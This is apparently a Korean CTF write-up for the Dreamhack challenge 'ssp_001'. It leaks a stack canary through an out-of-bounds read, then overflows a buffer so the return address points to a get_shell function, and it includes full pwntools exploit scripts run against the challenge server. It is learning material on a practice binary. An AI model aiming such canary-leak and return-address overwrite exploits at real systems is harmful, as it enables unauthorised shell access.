#canary #OOB #RAO #스택버퍼오버플로우 

### 1. 파일 정보

file ./ssp_001
./ssp_001: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ee998115adcc2751595b8d60732998fe634dfd8, not stripped

checksec --file=./ssp_001
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols  FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   85 Symbols  No    0               2               ./ssp_001

ASLR이 적용되어 있고, 바이너리에는 Canary 와 NX가 적용되어 있다. PIE는 적용되지 않았다.

ASLR이 적용되어 있기 때문에 실행 시마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX가 적용되어 있기 때문에 임의의 위치에 셸코드를 집어넣은 후 그 주소의 코드를 바로 실행시킬 수 없다.

### 2. 코드 분석
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

/*
표준 입출력을 버퍼링없이 즉시 처리하도록 설정
SIGALRM 시그널 핸들러를 등록 -> 30초 타임아웃 후 TIME OUT 출력하고 종료 
*/
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

/*
익스프로잇 목표가 될 함수
main 코드에서는 직접 호출되지 않으므로, 공격자가 RET 주소를 조작하거나 함수 포인터 오염으로 실행해야 함. 
*/
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}

/*
1) Fill (case 'F')
read 로 box 크기(64바이트)만큼만 읽음 -> 버퍼 오버플로우 없음.

2) Print (cast 'P')
업력받은 idx에 대한 범위 검증 없음.
즉, idx가 0 ~ 63 범위를 벗어나면 -> Out of Bounds Read 발생
예: idx = 100 -> box[100] 참조 -> box 이후의 스택 메모리 읽기 가능
스택 상의 name, return address, canary 등 민감 데이터 유출 가능

3) Exit (case 'E')
name 버퍼 크기는 64바이트인데,
name_len 값을 그대로 사용해서 read(0, name, name_len); 수행
즉, 버퍼 오버플로우 가능 (name_len > 64)
따라서 return address 를 덮을 수 있음 -> get_shell() 실행 가능.
*/

int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx); // exploit
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len); // exploit
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```
main 함수의 RET에 get_shell 함수의 주소를 넣어 셸을 획득하는 것이 목표
또한 원하는 길이의 문자열을 name 에 입력 받을 수 있기 때문에 버퍼 오버플로우 취약점이 발생함.

### 3. 익스플로잇

##### 1) 카나리 위치 확인
``` 
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0804872b <+0>:     push   ebp
   0x0804872c <+1>:     mov    ebp,esp
   0x0804872e <+3>:     push   edi
   0x0804872f <+4>:     sub    esp,0x94
   0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
...
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
End of assembler dump.
```

카나리 정보는 gs:0x14 에 있는 것을 확인 할 수 있다.
\[ebp - 0x8]의 주소의 4개 바이트를 알아내면 문제를 해결할 수 있다.

##### 2) box, name 주소 확인
``` c
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
```

```
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88]
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
```

box의 주소 : ebp-0x88

``` c
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
```

```
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
```

idx의 주소 : ebp-0x94

``` c
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
```

```
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90]
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
```

name의 주소 :  ebp-48

##### 3) 카나리 값 획득

box의 idx를 0x80 ~ 0x84로 설정해주면  \[ebp-0x8] ~ \[ebp-0x4] 사이의 카나리 4바이트를 읽을 수 있다.
``` python
from pwn import *

# 로컬에서 바이너리 ./ssp_001을 새 프로세스로 실행하고, 그 프로세스와 통신할 핸들 p를 얻음.
p = process("./ssp_001")

# 유출한 카나리 바이트들을 임시로 담아둘 파이썬 리스트
canary = []

'''
1. p.sendline(b"P")
: C 코드에서 case "P"일 때의 구문을 선택할 수 있기 위해 메뉴에 "P\n"을 보낸다.
: 프로그램은 read(0, select, 2)로 정확히 2바이트를 읽으니, b"P\n"이 딱 맞아 떨어진다.
: 그 결과 printf("Element index : ");가 출력되고 scanf("%d", &idx) 대기 상태가 됨.

2. p.sendline(str(0x08 + i).encode())
: 인덱스로 0x80 + i (즉 128, 129, 130, 131)를 문자열로 바꿔 보냄
: box는 64바이트 배열인데 범위를 훨씬 벗어난 인덱스를 주면 box[idx]가 스택의 윗부분(= box 다음에 놓인 값들)을 읽게 된다.
: 이 오프셋이 카나리 시작 지점과 맞아떨어진다고 가정하고, 연속 4바이트를 한 바이트씩 훔치는 전략이다.

3. p.recvuntil(b"is : )
: 프로그램이 print_box() 함수에서 찍는 "Element of index %d is : %02x\n" 중, "is : " 가 나올 때까지 모든 출력을 읽고 버립니다.
: 이렇게 동기화 해 두면 다음 recvline() 이 바로 그 바이트의 16진수 표현만 깔끔히 읽을 수 있게 된다.

4. canary.append(int(p.recvline(), 16))
: 방금 찍힌 %02x\n (예: 3f\n) 한 줄을 읽어서, 16진수 정수로 변환 -> 리스트에 추가.
: int(b"3f\n", 16)은 개행을 무시하고 0x3f로 잘 파싱된다.
: 이 값 범위는 0 ~ 255, 즉 한 바이트이다.
'''
for i in range(4):
    p.sendline(b"P")
    p.sendline(str(0x80 + i).encode())

    p.recvuntil(b"is : ")
    canary.append(int(p.recvline(), 16))

# [0xAA, 0xBB, 0xCC, 0xDD] 같은 정수 리스트 -> 실제 바이트열로 변환
# 메모리에서 읽은 그 순서 그대로의 생바이트가 됨.
canary = bytes(canary)

# 유출된 바이트들을 출력 파이썬은 b'\xaa\xbb\xcc\xdd' 같은 표현으로 보여줌.
# 사람이 보기 편하게 하려면 종종 print(canary.hex())를 쓰기도 함 -> aabbccdd
print(canary)

p.interactive()
```

##### 4) RET 덮기

```
pwndbg> p get_shell
$3 = {<text variable, no debug info>} 0x80486b9 <get_shell>
```
RET를 덮을 get_shell 함수의 주소를 얻어 온다.

``` python
from pwn import *

# 로컬에서 바이너리 ./ssp_001을 새 프로세스로 실행하고, 그 프로세스와 통신할 핸들 p를 얻음.
# p = process("./ssp_001")
p = remote("host8.dreamhack.games", 24339)

# 유출한 카나리 바이트들을 임시로 담아둘 파이썬 리스트
canary = []

'''
1. p.sendline(b"P")
: C 코드에서 case "P"일 때의 구문을 선택할 수 있기 위해 메뉴에 "P\n"을 보낸다.
: 프로그램은 read(0, select, 2)로 정확히 2바이트를 읽으니, b"P\n"이 딱 맞아 떨어진다.
: 그 결과 printf("Element index : ");가 출력되고 scanf("%d", &idx) 대기 상태가 됨.

2. p.sendline(str(0x08 + i).encode())
: 인덱스로 0x80 + i (즉 128, 129, 130, 131)를 문자열로 바꿔 보냄
: box는 64바이트 배열인데 범위를 훨씬 벗어난 인덱스를 주면 box[idx]가 스택의 윗부분(= box 다음에 놓인 값들)을 읽게 된다.
: 이 오프셋이 카나리 시작 지점과 맞아떨어진다고 가정하고, 연속 4바이트를 한 바이트씩 훔치는 전략이다.

3. p.recvuntil(b"is : )
: 프로그램이 print_box() 함수에서 찍는 "Element of index %d is : %02x\n" 중, "is : " 가 나올 때까지 모든 출력을 읽고 버립니다.
: 이렇게 동기화 해 두면 다음 recvline() 이 바로 그 바이트의 16진수 표현만 깔끔히 읽을 수 있게 된다.

4. canary.append(int(p.recvline(), 16))
: 방금 찍힌 %02x\n (예: 3f\n) 한 줄을 읽어서, 16진수 정수로 변환 -> 리스트에 추가.
: int(b"3f\n", 16)은 개행을 무시하고 0x3f로 잘 파싱된다.
: 이 값 범위는 0 ~ 255, 즉 한 바이트이다.
'''
for i in range(4):
    p.sendline(b"P")
    p.sendline(str(0x80 + i).encode())

    p.recvuntil(b"is : ")
    canary.append(int(p.recvline(), 16))

# [0xAA, 0xBB, 0xCC, 0xDD] 같은 정수 리스트 -> 실제 바이트열로 변환
# 메모리에서 읽은 그 순서 그대로의 생바이트가 됨.
canary = bytes(canary)

# 유출된 바이트들을 출력 파이썬은 b'\xaa\xbb\xcc\xdd' 같은 표현으로 보여줌.
# 사람이 보기 편하게 하려면 종종 print(canary.hex())를 쓰기도 함 -> aabbccdd
print(canary)

# b"A" * 0x40 
# : name 버퍼 채움.
# : 정확히 name[0x40]까지 덮어씌워서 스택 카나리 위치 직전까지 도달
# canary
# : 유출해 둔 카나리 값 그대로 삽입
# b"A" * 4
# : gdb에서 확인하면 카나리는 [ebp-0x8]에 위치하므로 패딩 4바이트를 추가해 준 것.
# b"B" * 4
# : SFP(EBP) 자리 채움
# p32(0x80486b9)
# : p32는 32비트 리틀 엔디언 포맷으로 변환(\xb9\x86\x04\x08)
payload = b"A" *0x40 + canary + b"A" * 4 + b"B" * 4 + p32(0x80486b9)

'''
p.sendline(b"E")
: 메뉴에서 "E\n" 입력 프로그램이 Name Size : 프롬프트 출력
: 즉, E case 진입

p.sendline(str(len(payload)).encode())
: scanf("%d", &name_len) 대기중이므로 페이로드 길이를 문자열로 보내줌.
: len(payload) 가 name 크기(64)보다 훨씬 크기 때문에 -> 버퍼 오버플로우 발생
: 단, 프로그램에서는 read(0, name, name_len);를 쓰므로 지정한 만큼 그대로 읽게됨

p.sendline(payload)
: 익스플로잇 페이로드 전송
'''
p.sendline(b"E")
p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()

```